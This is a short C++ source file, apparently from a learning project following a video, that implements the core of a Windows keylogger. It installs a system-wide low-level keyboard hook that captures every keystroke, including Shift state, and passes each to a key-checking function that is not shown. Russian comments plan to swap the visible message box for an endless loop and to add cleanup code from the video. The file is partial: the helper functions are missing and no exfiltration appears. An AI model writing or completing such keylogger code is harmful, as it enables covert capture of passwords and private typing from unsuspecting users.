#include "Keylogger.h" // Windows.h, iostream

// Дописать сюда функции очистки памяти из длинного видоса (2 часть)

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam){
    if (nCode == HC_ACTION) {
        PKBDLLHOOKSTRUCT keystroke = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
        if (keystroke->vkCode == VK_LSHIFT || keystroke->vkCode == VK_RSHIFT) {
            shiftStatement(wParam == WM_KEYDOWN ? true : false); // delete ?
//            shift = wParam == WM_KEYDOWN ? true : false; // original

        }
        else if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
            keyValueChecker(keystroke, wParam);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void runKeylogger() {
    SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, 0);
    //Убрать сообщение и сдедлать бесконечный цикл
    MessageBox(NULL, TEXT("Press OK"), TEXT("Information"), MB_OK);
}
